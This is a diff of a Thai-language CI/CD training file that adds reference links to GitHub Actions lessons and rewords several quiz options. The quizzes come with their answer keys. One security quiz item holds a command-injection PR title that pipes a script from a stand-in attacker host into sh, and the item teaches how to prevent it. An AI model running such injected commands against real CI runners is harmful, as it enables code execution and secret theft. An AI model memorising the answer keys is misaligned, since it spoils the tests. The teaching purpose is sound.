@@ -8,65 +8,77 @@
     {
       "tier": "must",
       "title": "CI, Continuous Delivery และ Continuous Deployment",
-      "body": "CI (Continuous Integration) คือทุกคน merge โค้ดเข้า main บ่อย ๆ (อย่างน้อยวันละครั้ง) และทุกการเปลี่ยนแปลงถูก build และ test อัตโนมัติ เพื่อจับปัญหาตอนที่ยังเล็ก Continuous Delivery ต่อยอดให้โค้ดบน main อยู่ในสภาพ deploy ได้เสมอ แต่การปล่อยขึ้น production ยังให้คนกดอนุมัติ ส่วน Continuous Deployment ตัดขั้นคนกดออก ทุกการเปลี่ยนแปลงที่ผ่าน pipeline ขึ้น production เองทันที กับดักที่พบบ่อยคือมี CI server แล้วคิดว่าทำ CI แล้ว ทั้งที่ยังทำงานบน branch อายุยาวหลายสัปดาห์"
+      "body": "CI (Continuous Integration) คือทุกคน merge โค้ดเข้า main บ่อย ๆ (อย่างน้อยวันละครั้ง) และทุกการเปลี่ยนแปลงถูก build และ test อัตโนมัติ เพื่อจับปัญหาตอนที่ยังเล็ก Continuous Delivery ต่อยอดให้โค้ดบน main อยู่ในสภาพ deploy ได้เสมอ แต่การปล่อยขึ้น production ยังให้คนกดอนุมัติ ส่วน Continuous Deployment ตัดขั้นคนกดออก ทุกการเปลี่ยนแปลงที่ผ่าน pipeline ขึ้น production เองทันที กับดักที่พบบ่อยคือมี CI server แล้วคิดว่าทำ CI แล้ว ทั้งที่ยังทำงานบน branch อายุยาวหลายสัปดาห์",
+      "ref": "https://martinfowler.com/articles/continuousIntegration.html"
     },
     {
       "tier": "must",
       "title": "ลำดับ stage และ fail fast",
-      "body": "pipeline ทั่วไปเรียงเป็น lint/compile → unit test และ security scan → build artifact → integration/E2E test → deploy staging → deploy production ขั้นที่เร็วและจับปัญหาได้บ่อยควรอยู่ต้น ๆ และหยุดทันทีเมื่อขั้นใดล้ม (fail fast) นักพัฒนาจะรู้ผลในไม่กี่นาที แทนที่จะรอ E2E 20 นาทีเพื่อเจอ typo ขั้นที่ไม่พึ่งกัน เช่น lint กับ unit test รันขนานกันได้ แต่ deploy ต้องรอให้ทุกขั้นก่อนหน้าผ่านเสมอ"
+      "body": "pipeline ทั่วไปเรียงเป็น lint/compile → unit test และ security scan → build artifact → integration/E2E test → deploy staging → deploy production ขั้นที่เร็วและจับปัญหาได้บ่อยควรอยู่ต้น ๆ และหยุดทันทีเมื่อขั้นใดล้ม (fail fast) นักพัฒนาจะรู้ผลในไม่กี่นาที แทนที่จะรอ E2E 20 นาทีเพื่อเจอ typo ขั้นที่ไม่พึ่งกัน เช่น lint กับ unit test รันขนานกันได้ แต่ deploy ต้องรอให้ทุกขั้นก่อนหน้าผ่านเสมอ",
+      "ref": "https://martinfowler.com/bliki/DeploymentPipeline.html"
     },
     {
       "tier": "must",
       "title": "GitHub Actions: on, jobs, steps และ runner",
       "body": "workflow คือไฟล์ YAML ใน .github/workflows/ โดย on กำหนด event ที่ trigger เช่น push, pull_request, schedule หรือ workflow_dispatch แต่ละ job รันบน runner ของตัวเอง (runs-on) และ jobs รันขนานกันโดย default ถ้าต้องรอกันต้องใส่ needs ภายใน job มี steps ที่รันเรียงกันบนเครื่องเดียว เป็นคำสั่ง shell (run) หรือ action สำเร็จรูป (uses) ก็ได้ และควรระบุเวอร์ชันของ action เสมอ เช่น @v7 หรือ pin เป็น commit SHA เมื่อต้องการความปลอดภัยสูงสุด",
-      "code": "on: pull_request\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: npm ci && npm test\n  build:\n    needs: test        # รอ test ผ่านก่อน\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: npm ci && npm run build"
+      "code": "on: pull_request\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: npm ci && npm test\n  build:\n    needs: test        # รอ test ผ่านก่อน\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: npm ci && npm run build",
+      "ref": "https://docs.github.com/en/actions/get-started/understand-github-actions#the-components-of-github-actions"
     },
     {
       "tier": "must",
       "title": "Secrets และ OIDC",
       "body": "ค่าลับเก็บใน repository หรือ environment secrets ซึ่ง GitHub mask ใน log ให้ แต่ถ้าโค้ดแปลงค่าแล้วพิมพ์ออก (เช่น base64) ก็ยังรั่วได้ จึงห้าม echo secret เด็ดขาด และ workflow ที่ trigger ด้วย pull_request จาก PR ของ fork จะไม่ได้รับ secrets (ยกเว้น GITHUB_TOKEN ที่อ่านได้อย่างเดียว) ตั้ง permissions ของ GITHUB_TOKEN ให้น้อยที่สุดเท่าที่งานต้องใช้ ดีกว่านั้นคือใช้ OIDC ซึ่ง workflow ขอ token อายุสั้นจาก GitHub แล้วแลกเป็น credential ชั่วคราวของ cloud โดยไม่ต้องเก็บ access key อายุยาวไว้เลย",
-      "code": "permissions:\n  id-token: write   # ให้ขอ OIDC token ได้\n  contents: read\nsteps:\n  - uses: aws-actions/configure-aws-credentials@v6\n    with:\n      role-to-assume: arn:aws:iam::123456789012:role/gha-deploy\n      aws-region: ap-southeast-1"
+      "code": "permissions:\n  id-token: write   # ให้ขอ OIDC token ได้\n  contents: read\nsteps:\n  - uses: aws-actions/configure-aws-credentials@v6\n    with:\n      role-to-assume: arn:aws:iam::123456789012:role/gha-deploy\n      aws-region: ap-southeast-1",
+      "ref": "https://docs.github.com/en/actions/concepts/security/openid-connect#benefits-of-using-oidc"
     },
     {
       "tier": "must",
       "title": "Build once, deploy many",
-      "body": "build artifact (เช่น container image) ครั้งเดียวต่อ commit ติด tag ที่ไม่เปลี่ยน เช่น commit SHA แล้วส่งชิ้นเดียวกันผ่าน dev → staging → production สิ่งที่ต่างกันระหว่าง environment ให้เป็น config หรือ environment variable ไม่ใช่การ build ใหม่ ถ้า build ใหม่ทุก environment อาจได้ dependency หรือ base image คนละเวอร์ชัน ผลทดสอบใน staging ก็ไม่รับประกันอะไร และอย่า deploy ด้วย tag latest เพราะชี้ไปที่ image ต่างกันได้ตามเวลา"
+      "body": "build artifact (เช่น container image) ครั้งเดียวต่อ commit ติด tag ที่ไม่เปลี่ยน เช่น commit SHA แล้วส่งชิ้นเดียวกันผ่าน dev → staging → production สิ่งที่ต่างกันระหว่าง environment ให้เป็น config หรือ environment variable ไม่ใช่การ build ใหม่ ถ้า build ใหม่ทุก environment อาจได้ dependency หรือ base image คนละเวอร์ชัน ผลทดสอบใน staging ก็ไม่รับประกันอะไร และอย่า deploy ด้วย tag latest เพราะชี้ไปที่ image ต่างกันได้ตามเวลา",
+      "ref": "https://12factor.net/build-release-run"
     },
     {
       "tier": "must",
       "title": "ทุก deploy ต้องย้อนกลับได้",
-      "body": "ก่อน deploy ต้องตอบได้ว่าถ้าพังจะกลับไปเวอร์ชันก่อนหน้าอย่างไรและใช้เวลากี่นาที วิธีที่เร็วที่สุดมักเป็นการ redeploy artifact เดิมที่เก็บไว้ (build once ทำให้ง่าย) ไม่ใช่ revert แล้วรอ build ใหม่ กับดักใหญ่คือ database migration ถ้าเวอร์ชันใหม่ลบหรือเปลี่ยนชื่อคอลัมน์ โค้ดเก่าจะพังทันทีที่ rollback จึงใช้แนว expand/contract คือเพิ่มของใหม่ก่อนให้โค้ดทั้งสองเวอร์ชันทำงานได้ แล้วค่อยลบของเก่าใน release ถัดไป"
+      "body": "ก่อน deploy ต้องตอบได้ว่าถ้าพังจะกลับไปเวอร์ชันก่อนหน้าอย่างไรและใช้เวลากี่นาที วิธีที่เร็วที่สุดมักเป็นการ redeploy artifact เดิมที่เก็บไว้ (build once ทำให้ง่าย) ไม่ใช่ revert แล้วรอ build ใหม่ กับดักใหญ่คือ database migration ถ้าเวอร์ชันใหม่ลบหรือเปลี่ยนชื่อคอลัมน์ โค้ดเก่าจะพังทันทีที่ rollback จึงใช้แนว expand/contract คือเพิ่มของใหม่ก่อนให้โค้ดทั้งสองเวอร์ชันทำงานได้ แล้วค่อยลบของเก่าใน release ถัดไป",
+      "ref": "https://dora.dev/capabilities/database-change-management/"
     },
     {
       "tier": "should",
       "title": "Caching และ feedback ที่เร็ว",
-      "body": "pipeline ที่ช้าทำให้คน merge น้อยลงและรวมงานเป็นก้อนใหญ่ ซึ่งขัดกับหลัก CI โดยตรง จึงควรตั้งเป้าให้ pipeline ของ PR จบในราว 10 นาทีหรือน้อยกว่า วิธีหลักคือ cache dependency ด้วย key ที่ผูกกับ lockfile (setup-node ทำให้ด้วย cache: npm) รัน job ที่ไม่พึ่งกันแบบขนาน และแบ่ง test ชุดใหญ่เป็นหลาย shard อย่าแก้ความช้าด้วยการลบ test หรือแคช node_modules เองด้วย key ที่ไม่ผูกกับ lockfile เพราะจะได้ dependency ค้างเก่าโดยไม่รู้ตัว (cache: npm ของ setup-node เก็บเฉพาะ package ที่ดาวน์โหลดไว้ และ npm ci ยังติดตั้งตาม lockfile จึงไม่เก่าแบบนั้น)"
+      "body": "pipeline ที่ช้าทำให้คน merge น้อยลงและรวมงานเป็นก้อนใหญ่ ซึ่งขัดกับหลัก CI โดยตรง จึงควรตั้งเป้าให้ pipeline ของ PR จบในราว 10 นาทีหรือน้อยกว่า วิธีหลักคือ cache dependency ด้วย key ที่ผูกกับ lockfile (setup-node ทำให้ด้วย cache: npm) รัน job ที่ไม่พึ่งกันแบบขนาน และแบ่ง test ชุดใหญ่เป็นหลาย shard อย่าแก้ความช้าด้วยการลบ test หรือแคช node_modules เองด้วย key ที่ไม่ผูกกับ lockfile เพราะจะได้ dependency ค้างเก่าโดยไม่รู้ตัว (cache: npm ของ setup-node เก็บเฉพาะ package ที่ดาวน์โหลดไว้ และ npm ci ยังติดตั้งตาม lockfile จึงไม่เก่าแบบนั้น)",
+      "ref": "https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching#using-contexts-to-create-cache-keys"
     },
     {
       "tier": "should",
       "title": "Deployment strategies: rolling, blue-green, canary",
-      "body": "Rolling ทยอยแทนที่ instance เก่าทีละส่วน ใช้ทรัพยากรเพิ่มน้อย แต่ระหว่างนั้นมีสองเวอร์ชันรันพร้อมกัน Blue-green เตรียม environment ใหม่ (green) ครบชุดคู่กับของเดิม (blue) แล้วสลับ traffic ทีเดียว rollback คือสลับกลับ แลกกับทรัพยากรสองเท่าชั่วคราว Canary ปล่อยเวอร์ชันใหม่ให้ traffic ส่วนน้อย เช่น 5% เทียบ metric กับเวอร์ชันเดิมแล้วค่อยขยายหรือถอย จึงจำกัดผลกระทบได้ดีที่สุด แต่ต้องมี observability ที่ดีพอจะตัดสินใจ"
+      "body": "Rolling ทยอยแทนที่ instance เก่าทีละส่วน ใช้ทรัพยากรเพิ่มน้อย แต่ระหว่างนั้นมีสองเวอร์ชันรันพร้อมกัน Blue-green เตรียม environment ใหม่ (green) ครบชุดคู่กับของเดิม (blue) แล้วสลับ traffic ทีเดียว rollback คือสลับกลับ แลกกับทรัพยากรสองเท่าชั่วคราว Canary ปล่อยเวอร์ชันใหม่ให้ traffic ส่วนน้อย เช่น 5% เทียบ metric กับเวอร์ชันเดิมแล้วค่อยขยายหรือถอย จึงจำกัดผลกระทบได้ดีที่สุด แต่ต้องมี observability ที่ดีพอจะตัดสินใจ",
+      "ref": "https://martinfowler.com/bliki/CanaryRelease.html"
     },
     {
       "tier": "should",
       "title": "Feature flags",
-      "body": "feature flag แยกการ deploy โค้ด (เอาขึ้น production) ออกจากการ release ฟีเจอร์ (เปิดให้ผู้ใช้เห็น) ทำให้ merge งานที่ยังไม่เสร็จเข้า main ได้โดยปิด flag ไว้ เปิดให้ผู้ใช้ทีละกลุ่ม และปิดฟีเจอร์ที่มีปัญหาได้ทันทีโดยไม่ต้อง deploy ใหม่ (kill switch) กับดักคือ flag ที่ไม่เคยถูกลบจะกลายเป็นหนี้เทคนิค โค้ดมีหลายเส้นทางที่ไม่มีใครทดสอบ จึงควรกำหนดวันลบตั้งแต่ตอนสร้าง"
+      "body": "feature flag แยกการ deploy โค้ด (เอาขึ้น production) ออกจากการ release ฟีเจอร์ (เปิดให้ผู้ใช้เห็น) ทำให้ merge งานที่ยังไม่เสร็จเข้า main ได้โดยปิด flag ไว้ เปิดให้ผู้ใช้ทีละกลุ่ม และปิดฟีเจอร์ที่มีปัญหาได้ทันทีโดยไม่ต้อง deploy ใหม่ (kill switch) กับดักคือ flag ที่ไม่เคยถูกลบจะกลายเป็นหนี้เทคนิค โค้ดมีหลายเส้นทางที่ไม่มีใครทดสอบ จึงควรกำหนดวันลบตั้งแต่ตอนสร้าง",
+      "ref": "https://martinfowler.com/articles/feature-toggles.html"
     },
     {
       "tier": "should",
       "title": "Observability หลัง deploy",
-      "body": "deploy ยังไม่จบตอน pipeline เขียว ต้องดูว่าระบบจริงยังปกติไหมผ่าน metric (error rate, latency, saturation), log และ trace โดยเทียบกับก่อน deploy ใส่เวอร์ชันหรือ commit SHA ลงใน log และ metric และทำเครื่องหมายเวลา deploy บน dashboard จะชี้ได้ทันทีว่าปัญหาเริ่มจาก release ไหน ตั้ง alert ตามอาการที่ผู้ใช้เจอ เช่น error rate ของ API และให้การตัดสินใจขยาย canary หรือ rollback อัตโนมัติอ้างอิง metric เหล่านี้"
+      "body": "deploy ยังไม่จบตอน pipeline เขียว ต้องดูว่าระบบจริงยังปกติไหมผ่าน metric (error rate, latency, saturation), log และ trace โดยเทียบกับก่อน deploy ใส่เวอร์ชันหรือ commit SHA ลงใน log และ metric และทำเครื่องหมายเวลา deploy บน dashboard จะชี้ได้ทันทีว่าปัญหาเริ่มจาก release ไหน ตั้ง alert ตามอาการที่ผู้ใช้เจอ เช่น error rate ของ API และให้การตัดสินใจขยาย canary หรือ rollback อัตโนมัติอ้างอิง metric เหล่านี้",
+      "ref": "https://sre.google/sre-book/monitoring-distributed-systems/#xref_monitoring_golden-signals"
     },
     {
       "tier": "advanced",
       "title": "Infrastructure as Code",
       "body": "นิยาม infrastructure เช่น network, database และ IAM เป็นโค้ดด้วยเครื่องมืออย่าง Terraform, OpenTofu, Pulumi หรือ CloudFormation เก็บใน Git ผ่าน code review และรันผ่าน pipeline เหมือนโค้ดแอป ทำให้สร้าง environment ซ้ำได้เหมือนเดิมและรู้ว่าใครเปลี่ยนอะไรเมื่อไร ขั้นสำคัญคือแสดงผล plan ใน PR ให้ review ก่อน apply กับดักที่พบบ่อยคือแก้ผ่าน console ด้วยมือ ทำให้ของจริงไม่ตรงกับโค้ด (drift) และ apply ครั้งถัดไปอาจเขียนทับการแก้นั้น",
-      "code": "terraform fmt -check\nterraform validate\nterraform plan -out=tfplan   # แสดงผลใน PR ให้ review\nterraform apply tfplan       # หลัง merge เท่านั้น"
+      "code": "terraform fmt -check\nterraform validate\nterraform plan -out=tfplan   # แสดงผลใน PR ให้ review\nterraform apply tfplan       # หลัง merge เท่านั้น",
+      "ref": "https://martinfowler.com/bliki/InfrastructureAsCode.html"
     },
     {
       "tier": "advanced",
       "title": "DORA metrics",
-      "body": "DORA วัดประสิทธิภาพการส่งมอบซอฟต์แวร์ด้วย 5 ตัวชี้วัด กลุ่ม throughput คือ change lead time (จาก commit ถึง production), deployment frequency และ failed deployment recovery time ส่วนกลุ่ม instability คือ change fail rate และ deployment rework rate (rework rate เพิ่มเข้ามาในปี 2024 ส่วน recovery time มาแทน MTTR ในปี 2023) งานวิจัยของ DORA พบว่าความเร็วกับความเสถียรไปด้วยกันได้ ทีมที่ดีมักทำได้ดีทั้งสองกลุ่ม ใช้ดูแนวโน้มของทีมเพื่อหาจุดปรับปรุง ไม่ใช่เอาไปจัดอันดับคนหรือทีม"
+      "body": "DORA วัดประสิทธิภาพการส่งมอบซอฟต์แวร์ด้วย 5 ตัวชี้วัด กลุ่ม throughput คือ change lead time (จาก commit ถึง production), deployment frequency และ failed deployment recovery time ส่วนกลุ่ม instability คือ change fail rate และ deployment rework rate (rework rate เพิ่มเข้ามาในปี 2024 ส่วน recovery time มาแทน MTTR ในปี 2023) งานวิจัยของ DORA พบว่าความเร็วกับความเสถียรไปด้วยกันได้ ทีมที่ดีมักทำได้ดีทั้งสองกลุ่ม ใช้ดูแนวโน้มของทีมเพื่อหาจุดปรับปรุง ไม่ใช่เอาไปจัดอันดับคนหรือทีม",
+      "ref": "https://dora.dev/guides/dora-metrics/"
     },
     {
       "tier": "must",
@@ -163,7 +175,7 @@
         "Continuous Deployment เพราะทุกขั้นของการ deploy เขียนเป็น script ไว้แล้ว",
         "แค่ CI เท่านั้น เพราะยังมีคนเข้ามาเกี่ยวข้องก่อนขึ้น production",
         "Continuous Delivery เพราะพร้อมปล่อยเสมอ แต่ให้คนตัดสินใจขั้นสุดท้าย",
-        "Continuous Deployment เพราะ staging ได้รับการ deploy โดยอัตโนมัติ"
+        "Continuous Deployment เพราะ staging ได้รับการ deploy โดยอัตโนมัติทุกครั้ง"
       ],
       "answer": 2,
       "explain": "Continuous Delivery คือทุกการเปลี่ยนแปลงพร้อมขึ้น production ได้เสมอ แต่การกดปล่อยเป็นการตัดสินใจของคน ส่วน Continuous Deployment ต้องปล่อยขึ้น production อัตโนมัติทุกครั้งที่ผ่าน pipeline การ deploy staging อัตโนมัติจึงยังไม่นับเป็น Continuous Deployment"
@@ -207,7 +219,7 @@
       "prompt": "pipeline สั่ง docker build แยกกันใน job deploy-staging และ deploy-production โดย Dockerfile ใช้ FROM node:24 บั๊กหนึ่งเกิดเฉพาะบน production ทั้งที่ staging ผ่านการทดสอบครบ สาเหตุที่น่าสงสัยที่สุดและวิธีแก้คืออะไร",
       "options": [
         "staging มี traffic น้อยกว่ามาก จึงควรเพิ่ม load test ก่อน deploy production",
-        "ให้ทั้งสอง environment ใช้ tag latest เหมือนกัน image จะได้ตรงกันเสมอ",
+        "ให้ทั้งสอง environment ใช้ tag latest เหมือนกัน image จะได้ตรงกันเสมอทุกครั้ง",
         "build สองครั้งอาจได้ base image ต่างกัน ควร build ครั้งเดียวแล้ว promote",
         "production ควร build ด้วย --no-cache เสมอ เพื่อให้ได้ของใหม่ที่สุด"
       ],
@@ -229,7 +241,7 @@
       "prompt": "release ใหม่มี migration ที่เปลี่ยนชื่อคอลัมน์ users.name เป็น full_name ทีมใช้ blue-green และวางแผนว่าถ้ามีปัญหาจะสลับ traffic กลับไปที่ blue ภายในหนึ่งนาที แผนนี้มีจุดอ่อนอะไร",
       "options": [
         "ไม่มีจุดอ่อน เพราะ blue-green แยก database ให้แต่ละสีโดยอัตโนมัติ",
-        "blue-green ช้าเกินไป ควรเปลี่ยนเป็น rolling เพื่อให้ rollback เร็วกว่า",
+        "blue-green ช้าเกินไป ควรเปลี่ยนเป็น rolling เพื่อให้ rollback ได้เร็วกว่าเดิม",
         "ต้อง restore database จาก backup ทุกครั้งที่สลับกลับ ซึ่งถือเป็นเรื่องปกติ",
         "โค้ดใน blue ยังอ่านคอลัมน์ name ที่ไม่มีแล้ว ควรใช้แนว expand/contract"
       ],
@@ -273,10 +285,10 @@
       "prompt": "ทีมใช้ matrix ทดสอบ Node 22 และ 24 บน ubuntu และ windows (รวม 4 job) ใน PR หนึ่ง job ของ windows + Node 22 ล้ม แล้วเห็นว่า job ที่เหลือถูก Cancelled ทั้งที่บางตัวยังรันไม่เสร็จ ทีมอยากเห็นผลของทุกชุดค่าแม้บางชุดจะล้ม ควรทำอย่างไร",
       "code": "strategy:\n  matrix:\n    os: [ubuntu-latest, windows-latest]\n    node: [22, 24]",
       "options": [
-        "เพิ่ม needs ให้ทุกชุดค่ารอกันเอง เพื่อไม่ให้ job ถูกยกเลิกกลางคัน",
-        "ลดชุดค่าใน matrix ให้เหลือสองชุด เพื่อให้ล้มพร้อมกันและไม่ถูกยกเลิก",
-        "ตั้ง strategy.fail-fast: false เพราะโดยปริยายเป็น true และจะยกเลิก job ที่เหลือเมื่อมีตัวล้ม",
-        "ย้ายไปใช้ self-hosted runner เพราะ runner ของ GitHub ยกเลิก job ที่เหลือให้เองทุกครั้งที่มี job ใดล้ม"
+        "เพิ่ม needs ให้ทุกชุดค่าใน matrix รอกันเอง เพื่อไม่ให้ job ที่เหลือถูกยกเลิกกลางคัน",
+        "ลดชุดค่าใน matrix ให้เหลือสองชุด เพื่อให้ทั้งสองล้มพร้อมกันและไม่ถูกยกเลิกกลางคัน",
+        "ตั้ง strategy.fail-fast: false เพราะค่าเริ่มต้นเป็น true และจะยกเลิก job ที่เหลือ",
+        "ย้ายไปใช้ self-hosted runner เพราะ runner ของ GitHub ยกเลิก job ที่เหลือทุกครั้งที่มี job ล้ม"
       ],
       "answer": 2,
       "explain": "fail-fast มีค่าโดยปริยายเป็น true: เมื่อ job ในเมทริกซ์ล้ม GitHub จะยกเลิก job ที่กำลังรันและที่รอคิวทั้งหมด ตั้งเป็น false จึงจะได้ผลครบทุกชุด ส่วน needs ใช้กำหนดลำดับพึ่งพาระหว่าง job ไม่เกี่ยวกับการยกเลิก"
@@ -318,8 +330,8 @@
     {
       "prompt": "องค์กรอยากให้ deploy production ต้องมีคนที่ไม่ใช่ผู้กด push เป็นผู้อนุมัติเสมอ แม้ผู้กด push จะอยู่ในรายชื่อ required reviewers ด้วย ควรตั้งค่าอะไรบน environment",
       "options": [
-        "ตั้ง wait timer ให้นานพอ ผู้กด push จะได้ไม่มีโอกาสอนุมัติทัน",
-        "จำกัด deployment branches ให้เหลือเฉพาะ protected branches เพื่อให้มีแต่ branch ที่ผ่านการตรวจสอบเท่านั้นที่ deploy ได้",
+        "ตั้ง wait timer ให้นานพอ เพื่อให้ผู้กด push หมดโอกาสอนุมัติทันภายในเวลาที่กำหนด",
+        "จำกัด deployment branches ให้เหลือเฉพาะ protected branch ที่ผ่านการตรวจสอบมาแล้ว",
         "เปิด prevent self-review เพื่อไม่ให้ผู้ที่สั่ง deploy อนุมัติ deployment ของตัวเอง",
         "เพิ่ม required reviewers เป็น 6 คน เพราะ job จะเริ่มได้ต่อเมื่อ reviewer อนุมัติครบทุกคน"
       ],
@@ -330,10 +342,10 @@
       "prompt": "workflow ตรวจชื่อ PR ด้านล่างทำงานเมื่อมีคนเปิด PR ผู้ร่วมพัฒนาจากภายนอกตั้งชื่อ PR เป็น x\"; curl https://evil.example/s.sh | sh; echo \" ผลที่เกิดขึ้นและวิธีแก้ที่ถูกต้องคืออะไร",
       "code": "on: pull_request\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Title: ${{ github.event.pull_request.title }}\"",
       "options": [
-        "GitHub escape อักขระพิเศษให้อัตโนมัติ จึงปลอดภัยอยู่แล้ว ไม่ต้องแก้",
-        "ปลอดภัย เพราะ PR จาก fork ไม่ได้รับ secrets จึงสร้างความเสียหายไม่ได้เลย",
-        "ควรเปลี่ยน trigger เป็น pull_request_target เพื่อให้ workflow รันในบริบทที่เชื่อถือได้ของ repository หลักแทน",
-        "ค่าถูกแทนลงในสคริปต์ก่อนรัน คำสั่งที่แทรกเข้ามาจึงรันได้ ควรส่งผ่าน env แล้วอ้าง \"$TITLE\""
+        "GitHub escape อักขระพิเศษให้อัตโนมัติ จึงปลอดภัยอยู่แล้ว ไม่ต้องแก้ไขอะไรใน workflow นี้",
+        "ปลอดภัย เพราะ PR จาก fork ไม่ได้รับ secrets จึงสร้างความเสียหายต่อ repository ไม่ได้เลย",
+        "ควรเปลี่ยน trigger เป็น pull_request_target เพื่อให้ workflow รันในบริบทที่เชื่อถือได้ของ repo หลัก",
+        "ค่าถูกแทนลงในสคริปต์ก่อนรัน คำสั่งที่แทรกมาจึงรันได้ ควรส่งผ่าน env แล้วอ้าง \"$TITLE\""
       ],
       "answer": 3,
       "explain": "expression ใน run ถูกแทนด้วยข้อความจริงก่อนที่ shell จะรัน คำสั่งที่แทรกมาจึงทำงานบน runner ได้ การส่งค่าผ่าน env ทำให้ค่าเป็นแค่ตัวแปร ไม่ใช่ส่วนของสคริปต์ การที่ fork ไม่ได้ secrets ลดความเสียหายแต่ไม่ได้ป้องกันการรันคำสั่ง และ pull_request_target มีสิทธิ์สูงกว่าจึงยิ่งเสี่ยง"
@@ -342,10 +354,10 @@
       "prompt": "ใน push เข้า main ทีมพบว่า job deploy ไม่รันเลย ทั้งที่ test ผ่าน สาเหตุคือ lint ถูกกำหนดให้รันเฉพาะ PR (จึงถูกข้ามบน push) แล้ว deploy ระบุ needs ทั้งสอง ควรแก้อย่างไร",
       "code": "jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n  lint:\n    if: github.event_name == 'pull_request'\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n  deploy:\n    needs: [test, lint]\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./deploy.sh",
       "options": [
-        "เอา test ออกจาก needs เพราะ deploy ควรรอ lint เพียงอย่างเดียว แล้วย้ายขั้น test ไปรันหลัง deploy",
+        "เอา test ออกจาก needs เพราะ deploy ควรรอ lint อย่างเดียว แล้วย้ายขั้น test ไปรันหลัง deploy",
         "ใส่ continue-on-error: true ให้ deploy เพื่อให้ job รันต่อได้แม้ dependency ล้มหรือถูกข้าม",
-        "ใส่ if: ${{ !failure() && !cancelled() }} ให้ deploy รันเมื่อ dependency ไม่ล้ม แม้บางตัวถูกข้าม",
-        "ไม่ต้องแก้ เพราะ job ที่ถูกข้ามนับเป็นผ่านเสมอ deploy ต้องรันอยู่แล้ว"
+        "ใส่ if: ${{ !failure() && !cancelled() }} ให้ deploy รันเมื่อไม่มีตัวล้ม แม้บางตัวถูกข้าม",
+        "ไม่ต้องแก้ เพราะ job ที่ถูกข้ามนับเป็นผ่านเสมอ deploy จึงต้องรันอยู่แล้วตามปกติ"
       ],
       "answer": 2,
       "explain": "ถ้า job ที่ needs ถูกข้ามหรือล้ม job ที่พึ่งมันจะถูกข้ามตามไป เว้นแต่ใช้เงื่อนไข เช่น status function ที่ทำให้ job ทำงานต่อ !failure() && !cancelled() จะยังข้าม deploy เมื่อ test ล้ม แต่ไม่ถูกบล็อกเพียงเพราะ lint ถูกข้าม ส่วน continue-on-error ไม่เกี่ยวกับการข้ามของ dependency"
@@ -354,9 +366,9 @@
       "prompt": "repository ตั้ง required status check ชื่อ test ไว้บน main workflow ci.yml ที่สร้าง check นี้ถูกตั้ง on: pull_request ด้วย paths: [src/**] PR ที่แก้เฉพาะ README.md ค้างอยู่สถานะรอผลของ test และ merge ไม่ได้เลย เพราะอะไร",
       "options": [
         "GitHub ต้องการให้ admin ของ repository กด bypass ทุกครั้งที่ PR ไม่แตะโค้ดในโฟลเดอร์ src",
-        "workflow ถูกข้ามด้วย paths filter จึงไม่เคยรายงาน check นี้ ทำให้ค้าง Pending และ merge ไม่ได้",
-        "required status check ต้องตั้งเป็นแบบ strict ใน branch protection ก่อน PR ที่ไม่แตะโค้ดจึงจะผ่านได้",
-        "สถานะ skipped ไม่ถือว่าผ่าน required check จึงต้องให้ทุก job รันจริงเสมอ"
+        "workflow ถูกข้ามด้วย paths filter จึงไม่รายงาน check นี้ ค้าง Pending และ merge ไม่ได้",
+        "ต้องตั้ง required status check เป็นแบบ strict ใน branch protection ก่อน PR ที่ไม่แตะโค้ดจึงผ่าน",
+        "สถานะ skipped ไม่ถือว่าผ่าน required check จึงต้องให้ทุก job รันจริงเสมอไม่ว่าจะแตะโค้ดหรือไม่"
       ],
       "answer": 1,
       "explain": "เมื่อ workflow ถูกข้ามด้วย paths หรือ branch filter check ของมันจะค้างเป็น Pending และ PR ที่ต้องการ check นั้นจะ merge ไม่ได้ ทางออกคือให้ workflow รันทุก PR แล้วข้าม job ด้วย if ซึ่งสถานะ skipped ถือว่าผ่าน required check ได้ (ข้อสุดท้ายจึงผิด)"
@@ -401,10 +413,10 @@
       "prompt": "เพื่อให้ PR จากผู้ร่วมพัฒนาภายนอกใช้ secret ในการ test ได้ นักพัฒนาเปลี่ยน workflow เป็น pull_request_target ตามด้านล่าง (ต้องเปิด allow-unsafe-pr-checkout เพราะ checkout v7 ปฏิเสธ fork PR โดยปริยาย) ความเสี่ยงหลักคืออะไร",
       "code": "on: pull_request_target\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          allow-unsafe-pr-checkout: true\n      - run: npm ci && npm test",
       "options": [
-        "pull_request_target รันบน merge commit ในสภาพแวดล้อมแยก จึงไม่มีความเสี่ยงเพิ่มจากการ checkout",
-        "ความเสี่ยงมีเฉพาะตอน npm ci รัน install script ของ dependency ส่วน npm test ปลอดภัยอยู่แล้ว",
-        "โค้ดจาก PR ภายนอกถูกรันในบริบท default branch ที่อาจมี secrets และสิทธิ์เขียน",
-        "ปัญหาเดียวคือ workflow จะรันช้าลง เพราะต้อง checkout สอง repository"
+        "pull_request_target รันบน merge commit ในสภาพแวดล้อมแยก จึงไม่เพิ่มความเสี่ยงจากการ checkout",
+        "ความเสี่ยงมีเฉพาะตอน npm ci รัน install script ของ dependency ส่วน npm test ปลอดภัยแล้ว",
+        "โค้ดจาก PR ภายนอกถูกรันในบริบท default branch ที่อาจมี secrets และสิทธิ์เขียน repository",
+        "ปัญหาเดียวคือ workflow จะรันช้าลง เพราะต้อง checkout สอง repository และใช้ runner นานขึ้น"
       ],
       "answer": 2,
       "explain": "pull_request_target รันในบริบทของ default branch ของ repo ปลายทาง การ checkout และรันโค้ดของ PR ที่นั่นเท่ากับให้คนนอกรันโค้ดเองด้วยสิทธิ์สูง (pwn request) ใช้ pull_request สำหรับ build และ test แล้วสงวน pull_request_target ไว้กับงานที่ไม่รันโค้ด PR เช่นการติด label"
@@ -414,9 +426,9 @@
